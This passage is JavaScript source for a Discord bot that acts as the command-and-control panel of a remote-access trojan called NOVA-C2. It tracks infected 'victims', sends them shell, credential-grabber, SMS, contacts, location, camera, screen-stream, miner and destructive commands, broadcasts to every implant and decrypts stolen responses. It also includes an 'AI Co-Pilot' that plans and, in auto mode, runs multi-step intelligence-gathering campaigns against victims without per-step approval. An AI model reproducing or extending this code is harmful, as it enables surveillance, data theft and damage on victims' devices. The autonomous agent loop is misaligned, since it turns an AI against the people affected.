          return r.ok ? i.editReply(`${E.knife} Miner: \`${payload}\` ${E.skull}`) : i.editReply(`${E.coffin} ${r.err} ${E.skull}`)
        }
        case 'upload': {
          const filePath = options.getString('path')
          await guild.channels.fetch()
          const t = await requireTarget(guild, targets, uid)
          if (!t.channel) return i.editReply(`${E.coffin} ${t.err} ${E.skull}`)
          const r = await sendCmdLogged(t.channel, 'upload', filePath, uid, user.username)
          return r.ok ? i.editReply(`${E.knife} Upload: \`${filePath}\` ${E.skull}`) : i.editReply(`${E.coffin} ${r.err} ${E.skull}`)
        }
        case 'stream': {
          const action = options.getString('action') || 'start'
          const payload = ['start', 'stop'].includes(action) ? action : (parseInt(action) >= 1 && parseInt(action) <= 30 ? action : 'start')
          await guild.channels.fetch()
          const t = await requireTarget(guild, targets, uid)
          if (!t.channel) return i.editReply(`${E.coffin} ${t.err} ${E.skull}`)
          const r = await sendCmdLogged(t.channel, 'stream', payload, uid, user.username)
          return r.ok ? i.editReply(`${E.knife} Stream: \`${payload}\` ${E.skull}`) : i.editReply(`${E.coffin} ${r.err} ${E.skull}`)
        }
        case 'voicestream': {
          await guild.channels.fetch()
          const voiceChannel = options.getChannel('channel')
          if (!voiceChannel || !voiceChannel.isVoiceBased()) return i.editReply(`${E.warning} Select a voice channel ${E.skull}`)
          const t = await requireTarget(guild, targets, uid)
          if (!t.channel) return i.editReply(`${E.coffin} ${t.err} ${E.skull}`)
          const botUrl = process.env.BOT_HTTP_URL
          await i.editReply(`${E.satellite} Joining \`${voiceChannel.name}\`...`)
          const started = await videoStream.startStream(t.name.replace('device-', ''), { voiceChannelId: voiceChannel.id, guildId: guild.id, textChannelId: i.channelId, fps: 5, width: 640, height: 480 })
          if (!started) return i.editReply(`${E.coffin} Failed to join VC ${E.skull}`)
          const payload = `voice ${voiceChannel.id} ${guild.id} ${i.channelId} ${botUrl}`
          await sendCmdLogged(t.channel, 'stream', payload, uid, user.username)
          return i.editReply(`${E.check} VC joined: \`${voiceChannel.name}\``)
        }
        case 'streamstop': {
          if (!targets.has(uid)) return i.editReply(`${E.warning} No target ${E.skull}`)
          const t = resolveTarget(guild, targets, uid)
          const deviceId = t.channel?.name?.replace('device-', '')
          if (deviceId) videoStream.stopStream(deviceId)
          return i.editReply(`${E.check} Stream stopped ${E.skull}`)
        }
        case 'streamstatus': {
          const status = videoStream.getStreamStatus()
          if (!status) return i.editReply(`${E.warning} No active streams ${E.skull}`)
          return i.editReply(`${E.satellite} **Streams** (${status.total} active)\n${status.streams.map(s => `${s.active ? E.online : E.offline} **${s.deviceId}** | ${s.fps}fps | ${s.frames}frames | ${s.uptime}s`).join('\n')}`)
        }
      }
    } catch (err) {
      console.error('Slash error:', err.message)
      try { await i.editReply(`${E.coffin} ${err.message} ${E.skull}`) } catch {}
    }
    return
  }

  // ── BUTTONS & MENUS ──────────────────────────────────────────────────
  if (!i.isButton() && !i.isStringSelectMenu()) return
  try {
    if (ALLOWED_CHANNEL_ID && i.channelId !== ALLOWED_CHANNEL_ID) return
    const uid = i.user.id, guild = i.guild
    if (!guild) return
    if (isRateLimited(uid)) return i.reply({ content: `${E.skull} Rate limit`, ephemeral: true }).catch(() => {})
    if (isOnCooldown(uid)) return i.reply({ content: `${E.skull} Cooldown`, ephemeral: true }).catch(() => {})
    if (!i.deferred && !i.replied) await i.deferUpdate().catch(() => {})

    // Pagination
    if (i.customId === 'prev' || i.customId === 'next') {
      const d = devicePages.get(i.message.id)
      if (!d) return i.followUp({ content: `${E.coffin} Expired — refresh`, ephemeral: true }).catch(() => {})
      d.idx = i.customId === 'prev' ? Math.max(0, d.idx - 1) : Math.min(d.pages.length - 1, d.idx + 1)
      return i.editReply({ embeds: d.pages[d.idx].embeds, components: d.pages[d.idx].components }).catch(() => {})
    }

    // Select menu
    if (i.customId === 'sel') {
      const ch = guild.channels.cache.get(i.values?.[0])
      if (!ch) return i.update({ content: `${E.coffin} Not found`, components: [] }).catch(() => {})
      targets.set(uid, { chId: ch.id, ts: Date.now() })
      return i.update({ content: `${E.knife} **${ch.name}**`, components: RESULT_BTNS }).catch(() => {})
    }

    // Select pagination
    if (i.customId === 'sel_prev' || i.customId === 'sel_next') {
      const d = devicePages.get(i.message.id)
      if (!d) return i.followUp({ content: `${E.coffin} Expired`, ephemeral: true }).catch(() => {})
      d.idx = i.customId === 'sel_prev' ? Math.max(0, d.idx - 1) : Math.min(d.pages.length - 1, d.idx + 1)
      return i.update({ components: d.pages[d.idx].components }).catch(() => {})
    }

    // Alert buttons
    if (i.customId.startsWith('a_')) {
      const parts = i.customId.split('_')
      const cmdKey = parts[1]; const chId = parts.slice(2).join('_')
      if (cmdKey === 'menu') return i.editReply({ ...menuEmbed(), components: MENU_BTNS, ephemeral: true }).catch(() => {})
      if (cmdKey === 'victims') {
        await guild.channels.fetch().catch(() => {}); await refreshDeviceStatus(guild, false)
        const pages = buildDevicePages(guild)
        return pages.length ? i.editReply({ embeds: pages[0].embeds, components: pages[0].components, ephemeral: true }).catch(() => {}) : i.editReply({ content: `${E.coffin} No implants`, ephemeral: true }).catch(() => {})
      }
      const ch = guild.channels.cache.get(chId)
      if (!ch) return i.editReply({ content: `${E.coffin} Channel gone`, ephemeral: true }).catch(() => {})
      const actualCmd = ALERT_CMD_MAP[cmdKey] || cmdKey
      const result = await sendCmd(ch, actualCmd, actualCmd === 'grabber' ? 'all' : '')
      return result.ok
        ? i.editReply({ content: `${E.knife} \`!${actualCmd}\` sent ${E.skull}`, components: RESULT_BTNS, ephemeral: true }).catch(() => {})
        : i.editReply({ content: `${E.coffin} ${result.err} ${E.skull}`, ephemeral: true }).catch(() => {})
    }

    // Navigation buttons
    if (i.customId === 'devices') {
      await guild.channels.fetch().catch(() => {}); await refreshDeviceStatus(guild, false)
      const pages = buildDevicePages(guild)
      if (!pages.length) return i.followUp({ content: `${E.coffin} No implants`, ephemeral: true }).catch(() => {})
      const reply = await i.followUp({ embeds: pages[0].embeds, components: pages[0].components, fetchReply: true }).catch(() => {})
      if (!reply) return
      if (pages.length > 1) {
        devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
        setTimeout(async () => { devicePages.delete(reply.id); try { await reply.edit({ components: [...paginationRow(true), ...MENU_BTNS] }) } catch {} }, PAGINATION_TIMEOUT)
      }
      return
    }
    if (i.customId === 'menu') return i.followUp({ ...menuEmbed(), components: MENU_BTNS, ephemeral: true }).catch(() => {})
    if (i.customId === 'help') return i.followUp({ ...helpEmbed(), components: HELP_BTNS, ephemeral: true }).catch(() => {})
    if (i.customId === 'info') return i.followUp({ content: `${E.bone} **NOVA-C2 v3.1**\n${E.zap} WebSocket Gateway\n${E.heart} Heartbeat: 4-7 min\n${E.target} Commands: ${DEV_CMDS.size}\n${E.ghost} Max victims: unlimited`, ephemeral: true }).catch(() => {})

    // Target button
    if (i.customId === 'target') {
      await guild.channels.fetch().catch(() => {})
      const channels = getPhantomChannels(guild)
      if (!channels.size) return i.followUp({ content: `${E.coffin} No victims`, ephemeral: true }).catch(() => {})
      if (channels.size === 1) { targets.set(uid, { chId: channels.first().id, ts: Date.now() }); return i.followUp({ content: `${E.knife} Target: ${channels.first().name}`, components: RESULT_BTNS, ephemeral: true }).catch(() => {}) }
      const pages = devSelectPages(channels)
      if (!pages.length) return i.followUp({ content: `${E.warning} Use \`!target <name>\``, ephemeral: true }).catch(() => {})
      try {
        const reply = await i.followUp({ content: `Select victim ${E.knife}`, components: pages[0].components, ephemeral: true, fetchReply: true })
        if (pages.length > 1) { devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() }); setTimeout(() => devicePages.delete(reply.id), SELECT_TIMEOUT) }
      } catch { await i.followUp({ content: `${E.coffin} Selector failed`, ephemeral: true }).catch(() => {}) }
      return
    }

    // Device action buttons (screenshot, stream, shell, dir, grabber, contacts, sms, location, camera, tree, disk)
    if (BTN_ACTIONS[i.customId]) {
      await guild.channels.fetch().catch(() => {})
      const channels = getPhantomChannels(guild)
      if (!channels.size) return i.editReply({ content: `${E.coffin} No devices` }).catch(() => {})
      if (targets.has(uid)) {
        const r = await sendToTarget(uid, guild, BTN_ACTIONS[i.customId])
        if (r.ok) return i.editReply({ content: `${E.knife} \`!${BTN_ACTIONS[i.customId]}\` sent ${E.skull}`, components: RESULT_BTNS }).catch(() => {})
        if (r.err === 'no_target' || r.err === 'gone') { targets.delete(uid); return i.editReply({ content: `${E.coffin} No target`, components: [] }).catch(() => {}) }
        return i.editReply({ content: `${E.coffin} ${r.err}` }).catch(() => {})
      }
      if (channels.size === 1) {
        const r = await sendCmd(channels.first(), BTN_ACTIONS[i.customId])
        if (r.ok) targets.set(uid, { chId: channels.first().id, ts: Date.now() })
        return i.editReply({ content: r.ok ? `${E.knife} \`!${BTN_ACTIONS[i.customId]}\` sent ${E.skull}` : `${E.coffin} ${r.err}` }).catch(() => {})
      }
      const pages = devSelectPages(channels)
      if (!pages.length) return i.editReply({ content: `${E.warning} ${channels.size} devices. Use \`!${BTN_ACTIONS[i.customId]} <name>\`` }).catch(() => {})
      const m = await i.editReply({ content: `Select victim for \`!${BTN_ACTIONS[i.customId]}\` ${E.knife}`, components: pages[0].components }).catch(() => null)
      if (!m) return
      if (pages.length > 1) devicePages.set(m.id, { pages, idx: 0, ts: Date.now() })
      const col = (i.channel || await i.fetchReply()).createMessageComponentCollector({ filter: si => si.user.id === uid && si.customId === 'sel' && si.message.id === m.id, time: SELECT_TIMEOUT, max: 1 })
      col.on('collect', async si => {
        const ch = guild.channels.cache.get(si.values[0])
        if (ch) { const r = await sendCmd(ch, BTN_ACTIONS[i.customId]); if (r.ok) targets.set(uid, { chId: ch.id, ts: Date.now() }) }
        await si.update({ content: `${E.knife} \`!${BTN_ACTIONS[i.customId]}\` sent ${E.skull}`, components: [] }).catch(() => {})
      })
      col.on('end', async collected => { if (!collected.size) try { await m.edit({ content: `${E.coffin} Timed out`, components: [] }) } catch {} })
      return
    }

    // AI Co-Pilot buttons
    if (i.customId.startsWith('ai_approve_') || i.customId.startsWith('ai_reject_') || i.customId.startsWith('ai_auto_') || i.customId.startsWith('ai_more_') || i.customId.startsWith('ai_stop_') || i.customId.startsWith('ai_summary_') || i.customId.startsWith('ai_campaign_')) {
      const parts = i.customId.split('_')
      const action = parts[1], targetUid = parts.slice(2).join('_')
      if (i.user.id !== targetUid) return i.reply({ content: `${E.warning} Not your session`, ephemeral: true }).catch(() => {})
      const session = aiContext.getSession(guild.id, targetUid)
      if (!session) return i.update({ content: `${E.coffin} No session. Use \`!ai\` first`, components: [] }).catch(() => {})

      // HANDLE: reject
      if (action === 'reject') { aiContext.clearPendingProposal(session); return i.update({ content: `${E.coffin} Rejected`, components: [] }).catch(() => {}) }

      // HANDLE: stop
      if (action === 'stop') { session.autoMode = false; aiContext.clearPendingProposal(session); return i.update({ content: `${E.coffin} Stopped`, components: [] }).catch(() => {}) }

      // HANDLE: more ideas
      if (action === 'more') {
        await i.update({ content: `${E.tools} Generating alternatives...`, components: [] }).catch(() => {})
        try {
          const { response } = await aiCoPilot.generateMoreIdeas(guild.id, targetUid)
          const cmdList = response.proposedCommands.map((c, i) => `**${i + 1}.** \`${c.command}${c.args ? ' ' + c.args : ''}\` — ${c.reason}`).join('\n')
          const text = response.analysis ? `**Alternatives:** ${response.analysis}\n\n${cmdList}` : `**Alternatives:**\n${cmdList}`
          const aiBtns = [
            ...actionRow(btn(`ai_approve_${targetUid}`, 'APPROVE', '✅', 'success'), btn(`ai_auto_${targetUid}`, 'AUTO', '▶️', 'primary'), btn(`ai_more_${targetUid}`, 'MORE', '🔄', 'secondary'), btn(`ai_reject_${targetUid}`, 'REJECT', '❌', 'danger')),
            ...actionRow(btn(`ai_summary_${targetUid}`, 'SUMMARY', '📋', 'primary'), btn(`ai_campaign_${targetUid}`, 'CAMPAIGN', '🎯', 'secondary'), btn(`ai_stop_${targetUid}`, 'STOP', '⏹️', 'danger')),
          ].flat()
          return i.editReply({ ...bloodEmbed(bold('🤖 AI'), 'warning', text), components: aiBtns }).catch(() => {})
        } catch (err) { return i.editReply({ content: `${E.coffin} ${err.message}`, components: [] }).catch(() => {}) }
      }

      // HANDLE: summary
      if (action === 'summary') {
        await i.update({ content: `${E.tools} Generating intelligence report...`, components: [] }).catch(() => {})
        try {
          const { response } = await aiCoPilot.generateSummary(guild.id, targetUid)
          return i.editReply({ ...bloodEmbed(bold('🤖 INTELLIGENCE REPORT'), 'info', response.summary || response.analysis || 'No data gathered'), components: MENU_BTNS }).catch(() => {})
        } catch (err) { return i.editReply({ content: `${E.coffin} ${err.message}`, components: [] }).catch(() => {}) }
      }

      // HANDLE: campaign
      if (action === 'campaign') {
        await i.update({ content: `${E.tools} Planning campaign...`, components: [] }).catch(() => {})
        try {
          const ctx = aiContext.summarizeDeviceKnowledge(session)
          const campaign = await campaignManager.createCampaign(guild.id, targetUid, `Full intelligence campaign based on: ${ctx ? ctx.slice(0, 200) : 'unknown device'}`)
          const plan = await campaignManager.planCampaign(campaign, ctx)
          const phaseList = plan.phases.map((p, i) => `**Phase ${i + 1}: ${p.name}**${p.requiresApproval ? ' [⚠️]' : ''}\n${p.commands.map(c => `  ┃ \`${c.command}${c.args ? ' ' + c.args : ''}\` — ${c.reason}`).join('\n')}`).join('\n')
          const text = `**Objective:** ${campaign.objective}\n\n**Analysis:** ${plan.analysis}\n\n**Plan:**\n${phaseList}\n\n**Estimated:** ${plan.estimatedDuration || '?'} | **Risk:** ${(plan.riskLevel || 'medium').toUpperCase()}\n**ID:** \`${campaign.id}\``
          return i.editReply({ ...bloodEmbed(bold('🤖 CAMPAIGN'), 'warning', text), components: actionRow(btn(`cmp_approve_${targetUid}_${campaign.id}`, 'APPROVE', '✅', 'success'), btn(`cmp_reject_${targetUid}_${campaign.id}`, 'REJECT', '❌', 'danger')) }).catch(() => {})
        } catch (err) { return i.editReply({ content: `${E.coffin} ${err.message}`, components: [] }).catch(() => {}) }
      }

      // HANDLE: approve (execute proposed commands)
      if (!session.pendingProposal && action !== 'auto') return i.update({ content: `${E.coffin} No pending proposal`, components: [] }).catch(() => {})
      const proposal = action === 'auto' ? session.pendingProposal : session.pendingProposal
      if (!proposal || !proposal.proposedCommands?.length) {
        // In auto mode, if no proposals, try to generate first
        if (action === 'auto') {
          const { response } = await aiCoPilot.processRequest(guild.id, targetUid, 'Propose commands to gather intelligence on the target device. Start with recon.')
          aiContext.setPendingProposal(session, response)
          if (!response.proposedCommands?.length) return i.update({ content: `${E.coffin} AI proposed nothing`, components: [] }).catch(() => {})
        } else return i.update({ content: `${E.coffin} No commands to execute`, components: [] }).catch(() => {})
      }

      // Re-fetch proposal (may have been set by auto-mode init above)
      const activeProposal = session.pendingProposal
      if (!activeProposal?.proposedCommands?.length) return i.update({ content: `${E.coffin} Nothing to execute`, components: [] }).catch(() => {})

      const autoMode = action === 'auto'
      if (!autoMode) aiContext.clearPendingProposal(session)
      else session.autoMode = true

      await i.update({ content: `${E.heart} ${autoMode ? 'AUTO' : 'Executing'} ${activeProposal.proposedCommands.length} command(s)...`, components: [] }).catch(() => {})
      const results = []
      for (const pc of activeProposal.proposedCommands) {
        if (autoMode && !session.autoMode) { results.push('[STOPPED]'); break }
        const cmdName = pc.command.replace(/^!/, '')
        if (cmdName === 'target') {
          await guild.channels.fetch()
          const ch = findPhantomChannel(guild, pc.args)
          if (ch) { targets.set(i.user.id, { chId: ch.id, ts: Date.now() }); session.currentTarget = ch.id; aiContext.updateDeviceKnowledge(session, ch.id, 'model', ch.name); results.push(`[TARGET] ${ch.name}`) }
          else results.push(`[TARGET FAIL] "${pc.args}" not found`)
          continue
        }
        const t = resolveTarget(guild, targets, i.user.id)
        if (!t.channel) { results.push(`[SKIP] No target`); continue }
        const r = await sendCmdLogged(t.channel, cmdName, pc.args || '', i.user.id, i.user.username)
        if (r.ok) {
          results.push(`[SENT] \`${pc.command}${pc.args ? ' ' + pc.args : ''}\``)
          aiContext.markCommandExecuted(session, cmdName, pc.args || '')
          const isGrabber = cmdName === 'grabber'
          const response = await collectChannelResponse(t.channel, cmdName, isGrabber ? 120000 : 30000)
          if (response) {
            results.push(`[RESULT] ${response.slice(0, 5000)}`)
            aiContext.updateDeviceKnowledge(session, t.channel.id, `last_${cmdName}`, response.slice(0, 5000))
            if (isGrabber) {
              aiContext.addGrabRecord(session, t.channel.id, pc.args || 'all', response.slice(0, 500))
              try { const analysis = await analyzeResults(response, session); results.push(`[ANALYZER] ${analysis.summary}`); const decision = await decideNextActions(analysis, session); if (decision.commands?.length) results.push(`[DECIDER] ${decision.commands.map(c => c.command + ' ' + (c.args || '')).join(', ')}`) } catch {}
            }
          }
        } else results.push(`[FAIL] ${r.err}`)
      }

      const resultText = results.join('\n')
      aiContext.addToHistory(session, 'system', `Commands executed:\n${resultText}`)

      // AUTO MODE: loop until ready or stopped
      if (autoMode) {
        let iteration = 0
        const maxIterations = 15
        let lastResponse
        while (iteration < maxIterations && session.autoMode) {
          const followUp = await aiCoPilot.processResults(guild.id, i.user.id, resultText)
          lastResponse = followUp.response
          if (followUp.response.ready && followUp.response.summary) {
            await i.editReply({ content: `${E.heart} AUTO complete! Final report ready.`, components: [] }).catch(() => {})
            session.autoMode = false
            aiContext.clearPendingProposal(session)
            return i.editReply({ ...bloodEmbed(bold('🤖 AI AUTO REPORT'), 'info', `**Summary:**\n${followUp.response.summary}`), components: MENU_BTNS }).catch(() => {})
          }
          if (!followUp.response.proposedCommands?.length) break
          // Execute next batch
          const nextResults = []
          for (const pc of followUp.response.proposedCommands) {
            if (!session.autoMode) { nextResults.push('[STOPPED]'); break }
            const cmdName = pc.command.replace(/^!/, '')
            if (cmdName === 'target') continue
            const t = resolveTarget(guild, targets, i.user.id)
            if (!t.channel) { nextResults.push(`[SKIP] No target`); continue }
            const r = await sendCmdLogged(t.channel, cmdName, pc.args || '', i.user.id, i.user.username)
            if (r.ok) {
              nextResults.push(`[SENT] \`${pc.command}${pc.args ? ' ' + pc.args : ''}\``)
              aiContext.markCommandExecuted(session, cmdName, pc.args || '')
              const resp = await collectChannelResponse(t.channel, cmdName, 30000)
              if (resp) nextResults.push(`[RESULT] ${resp.slice(0, 2000)}`)
            } else nextResults.push(`[FAIL] ${r.err}`)
            await new Promise(r => setTimeout(r, 1500))
          }
          if (nextResults.length) {
            const nextText = nextResults.join('\n')
            aiContext.addToHistory(session, 'system', `Auto-executed:\n${nextText}`)
          }
          iteration++
        }
        session.autoMode = false
        aiContext.clearPendingProposal(session)
        const ctx = aiContext.summarizeDeviceKnowledge(session)
        return i.editReply({ ...bloodEmbed(bold('🤖 AUTO DONE'), 'info', ctx || 'No data gathered'), components: MENU_BTNS }).catch(() => {})
      }

      // MANUAL MODE: show follow-up
      const followUp = await aiCoPilot.processResults(guild.id, i.user.id, resultText)
      if (followUp.response.ready && followUp.response.summary) {
        const nextBtns = followUp.response.proposedCommands?.length ? [
          ...actionRow(btn(`ai_approve_${i.user.id}`, 'EXECUTE NEXT', '▶️', 'success'), btn(`ai_auto_${i.user.id}`, 'AUTO', '▶️', 'primary'), btn(`ai_reject_${i.user.id}`, 'STOP', '⏹️', 'danger')),
          ...actionRow(btn(`ai_summary_${i.user.id}`, 'SUMMARY', '📋', 'primary'), btn(`ai_campaign_${i.user.id}`, 'CAMPAIGN', '🎯', 'secondary')),
        ].flat() : MENU_BTNS
        return i.editReply({ ...bloodEmbed(bold('AI REPORT'), 'info', `**✅ EXECUTED**\`\`\`${resultText.slice(0, 1500)}\`\`\`\n**${followUp.response.summary}**`), components: nextBtns }).catch(() => {})
      }
      const cmdList = followUp.response.proposedCommands.map((c, i) => `**${i + 1}.** \`${c.command}${c.args ? ' ' + c.args : ''}\` — ${c.reason}`).join('\n')
      const text = followUp.response.analysis ? `**Results:**\`\`\`${resultText.slice(0, 1000)}\`\`\`\n**Analysis:** ${followUp.response.analysis}\n\n**Next:**\n${cmdList}` : `**Results:**\`\`\`${resultText.slice(0, 1000)}\`\`\`\n**Next:**\n${cmdList}`
      aiContext.setPendingProposal(session, followUp.response)
      const aiBtns = [
        ...actionRow(btn(`ai_approve_${i.user.id}`, 'APPROVE', '✅', 'success'), btn(`ai_auto_${i.user.id}`, 'AUTO', '▶️', 'primary'), btn(`ai_more_${i.user.id}`, 'MORE', '🔄', 'secondary'), btn(`ai_reject_${i.user.id}`, 'REJECT', '❌', 'danger')),
        ...actionRow(btn(`ai_summary_${i.user.id}`, 'SUMMARY', '📋', 'primary'), btn(`ai_campaign_${i.user.id}`, 'CAMPAIGN', '🎯', 'secondary'), btn(`ai_stop_${i.user.id}`, 'STOP', '⏹️', 'danger')),
      ].flat()
      return i.editReply({ ...bloodEmbed(bold('AI CO-PILOT'), 'warning', text), components: aiBtns }).catch(() => {})
    }

    // Campaign buttons
    if (i.customId.startsWith('cmp_')) {
      const parts = i.customId.split('_'), action = parts[1], targetUid = parts[2], campaignId = parts.slice(3).join('_')
      if (i.user.id !== targetUid) return i.reply({ content: `${E.warning} Not yours`, ephemeral: true }).catch(() => {})
      const campaign = campaignManager.getCampaign(guild.id, targetUid, campaignId)
      if (!campaign || campaign.status === 'aborted') return i.update({ content: `${E.coffin} Gone`, components: [] }).catch(() => {})
      if (action === 'reject') { campaignManager.cancelCampaign(guild.id, targetUid, campaignId); return i.update({ content: `${E.coffin} Cancelled`, components: [] }).catch(() => {}) }
      if (action === 'plan') return i.update({ content: `${E.tools} Manual planning not available`, components: [] }).catch(() => {})
      await i.update({ content: `${E.heart} Campaign executing...`, components: [] }).catch(() => {})
      try {
        const texts = []
        while (campaign.status !== 'completed' && campaign.status !== 'failed' && campaign.status !== 'aborted') {
          const result = await campaignManager.executePhase(campaign, guild, client)
          texts.push(`[${result.phase || '?'}] ${result.status}`)
          if (campaign.currentPhaseIndex % 2 === 0 || result.status === 'completed' || result.status === 'failed') {
            const p = `${'█'.repeat(campaign.currentPhaseIndex)}${'░'.repeat(Math.max(0, campaign.phases.length - campaign.currentPhaseIndex))}`
            await i.editReply({ content: `${E.heart} \`${campaignId}\`\n\`\`\`${p}\`\`\`${campaign.progress} | ${campaign.elapsed}\n${texts.slice(-3).join('\n')}` }).catch(() => {})
          }
          if (result.status === 'failed' || result.status === 'aborted') break
        }
        const report = await campaignManager.generateReport(campaign)
        const reportText = `**CAMPAIGN COMPLETE**\n**Objective:** ${campaign.objective}\n**Duration:** ${campaign.elapsed}\n\n**Findings:**\n${(report.keyFindings || []).map(f => `• ${f}`).join('\n')}\n\n**Recommendations:**\n${(report.recommendations || []).map(r => `• ${r}`).join('\n')}`
        return i.editReply({ ...bloodEmbed(bold(`🤖 ${report.title || 'CAMPAIGN REPORT'}`), 'info', reportText), components: MENU_BTNS }).catch(() => {})
      } catch (err) { return i.editReply({ content: `${E.coffin} ${err.message}`, components: MENU_BTNS }).catch(() => {}) }
    }

    return i.followUp({ content: `${E.skull} Unknown`, ephemeral: true }).catch(() => {})
  } catch (err) {
    console.error('Interaction error:', err.message)
    try { await (i.deferred || i.replied ? i.followUp({ content: `${E.coffin} ${err.message}`, ephemeral: true }) : i.reply({ content: `${E.coffin} ${err.message}`, ephemeral: true })).catch(() => {}) } catch {}
  }
})

// ── HEARTBEAT WATCHER + RESPONSE FORMATTER + AUTO-DECRYPT ────────────────
client.on(Events.MessageCreate, async (msg) => {
  if (msg.author.bot && msg.channel.name?.startsWith('device-')) {
    const c = msg.content || ''
    if (c.includes(':heartbeat:') || c.includes('**Alive**') || c.includes('**Device Online**') || c.includes('**Reconnected**') || c.includes(':green_circle:')) {
      deviceStatus.set(msg.channel.id, { online: true, lastSeen: msg.createdTimestamp, name: msg.channel.name })
    }

    // Auto-decrypt encrypted (🔒 prefix) messages
    if (c.startsWith('🔒 ')) {
      const b64 = c.slice(2).trim()
      try {
        const plain = decrypt(b64)
        const decryptEmbed = new EmbedBuilder()
          .setColor(C.info)
          .setTitle(`${E.unlock} Decrypted Response`)
          .setDescription(`\`\`\`\n${plain.slice(0, 1900)}\n\`\`\``)
          .setFooter({ text: `auto-decrypted • ${msg.channel.name}` })
          .setTimestamp()
        await msg.reply({ embeds: [decryptEmbed] }).catch(() => {})
      } catch {}
      return
    }

    // Skip encrypt banner + base64 lines from decryption embed editing
    if (c.startsWith('🔒') || msg.author.id === client.user.id) return

    if (c.length > 2 && !msg.embeds.length) {
      try {
        const deviceName = msg.channel.name.replace('device-', '')
        const formatted = formatDeviceResponse(c, deviceName)
        if (formatted) {
          await msg.edit({ content: '', embeds: formatted.embeds }).catch(() => {})
        }
      } catch {}
    }
  }
})

// ── TEXT COMMANDS ───────────────────────────────────────────────────────
client.on(Events.MessageCreate, async (msg) => {
  if (msg.author.bot) return
  if (ALLOWED_CHANNEL_ID && msg.channel.id !== ALLOWED_CHANNEL_ID) return
  const raw = msg.content.trim()
  if (!raw.startsWith('!')) return
  const [cmd, ...args] = raw.split(/\s+/)
  const cmdL = cmd.toLowerCase()
  const uid = msg.author.id, guild = msg.guild
  if (!guild) return
  if (isRateLimited(uid) || isOnCooldown(uid)) return

  try {
    if (BOT_CMDS.includes(cmdL)) {
      switch (cmdL) {
        case '!help': return msg.reply({ ...helpEmbed(), components: HELP_BTNS })
        case '!menu': return msg.reply({ ...menuEmbed(), components: MENU_BTNS })
        case '!devices': {
          await guild.channels.fetch(); await refreshDeviceStatus(guild, false)
          const pages = buildDevicePages(guild)
          if (!pages.length) return msg.reply({ embeds: bloodEmbed('NO VICTIMS', 'offline', `${E.coffin} No devices ${E.skull}`).embeds })
          const reply = await msg.reply({ embeds: pages[0].embeds, components: pages[0].components })
          if (pages.length > 1) {
            devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
            setTimeout(async () => { devicePages.delete(reply.id); try { await reply.edit({ components: [...paginationRow(true), ...MENU_BTNS] }) } catch {} }, PAGINATION_TIMEOUT)
          }
          return
        }
        case '!target': {
          if (!args.length) {
            await guild.channels.fetch()
            const channels = getPhantomChannels(guild)
            if (!channels.size) return msg.reply(`${E.coffin} No victims ${E.skull}`)
            if (channels.size === 1) { targets.set(uid, { chId: channels.first().id, ts: Date.now() }); return msg.reply({ content: `${E.knife} Target: ${channels.first().name}`, components: RESULT_BTNS }) }
            const pages = devSelectPages(channels)
            const reply = await msg.reply({ content: `Select victim ${E.knife}`, components: pages[0].components })
            if (pages.length > 1) devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
            return
          }
          await guild.channels.fetch()
          const ch = findPhantomChannel(guild, args[0])
          if (!ch) return msg.reply(`${E.coffin} **${args[0]}** not found ${E.skull}`)
          targets.set(uid, { chId: ch.id, ts: Date.now() })
          return msg.reply({ ...bloodEmbed(bold('TARGET ACQUIRED'), 'warning', `\`\`\`ansi\n${createBox(`${A.brightCyan}${smallCaps('target')}${A.reset}\n${A.cyan}┃${A.reset} ${mono(ch.name)}`, 'neon', 36)}\`\`\``), components: RESULT_BTNS })
        }
        case '!untarget': {
          const had = targets.delete(uid)
          return msg.reply({ ...bloodEmbed(bold('TARGET CLEARED'), 'warning', `${E.coffin} ${had ? 'Released' : 'None'} ${E.skull}`), components: MENU_BTNS })
        }
        case '!history': return msg.reply({ ...bloodEmbed(bold('COMMAND HISTORY'), 'info', `\`\`\`${formatCommandLog(uid)}\n\`\`\``, { footer: `${smallCaps('last 15')} ⚡ ${ts()}` }), components: MENU_BTNS, ephemeral: true })
        case '!search': {
          if (!args.length) return msg.reply(`${E.target} Usage: \`!search <name>\` ${E.skull}`)
          await guild.channels.fetch()
          const query = args.join(' ').toLowerCase()
          const matches = [...getPhantomChannels(guild).values()].filter(ch => ch.name.toLowerCase().includes(query))
          if (!matches.length) return msg.reply(`${E.coffin} No matches for "${query}" ${E.skull}`)
          const lines = [`${A.brightCyan}${smallCaps('results')}${A.reset}`]
          for (const ch of matches) { const st = deviceStatus.get(ch.id); const on = st?.online ?? false; lines.push(`${A.cyan}┃${A.reset} ${on ? E.online : E.offline} ${mono(ch.name)}`) }
          return msg.reply({ ...bloodEmbed(bold(`SEARCH: "${query}"`), 'warning', `\`\`\`ansi\n${createBox(lines.join('\n'), 'neon', 36)}\n\`\`\``, { footer: `${matches.length} result(s)` }), components: MENU_BTNS })
        }
        case '!broadcast': {
          const bc = args.join(' ').trim()
          if (!bc) return msg.reply(`${E.bomb} Usage: \`!broadcast <cmd>\` ${E.skull}`)
          const p = bc.replace(/^!+/, '').split(/\s+/)
          const bcCmd = p[0], bcPayload = p.slice(1).join(' ')
          if (!VALID_CMDS.has(bcCmd)) return msg.reply(`${E.warning} Invalid: \`!${bcCmd}\` ${E.skull}`)
          if (DESTRUCTIVE_CMDS.includes(bcCmd) && !bcPayload.startsWith('--force')) {
            return msg.reply({ ...bloodEmbed(bold(`${E.bomb} CONFIRM BROADCAST`), 'danger', `**Command:** \`!${bcCmd}\` to ALL\n**Warning:** Destructive!\n\nReply: \`!broadcast ${bcCmd} --force\``), components: MENU_BTNS })
          }
          await guild.channels.fetch()
          const channels = getPhantomChannels(guild)
          if (!channels.size) return msg.reply(`${E.coffin} No devices ${E.skull}`)
          let sent = 0, failed = [], retryQueue = []
          for (const [, ch] of channels) {
            const r = await sendCmdLogged(ch, bcCmd, bcPayload, uid, msg.author.username)
            if (r.ok) sent++; else retryQueue.push({ ch, name: ch.name })
            if (channels.size > 3) await new Promise(r => setTimeout(r, 1200))
          }
          for (const item of retryQueue) {
            await new Promise(r => setTimeout(r, 2000))
            if ((await sendCmdLogged(item.ch, bcCmd, bcPayload, uid, msg.author.username)).ok) sent++; else failed.push(item.name)
          }
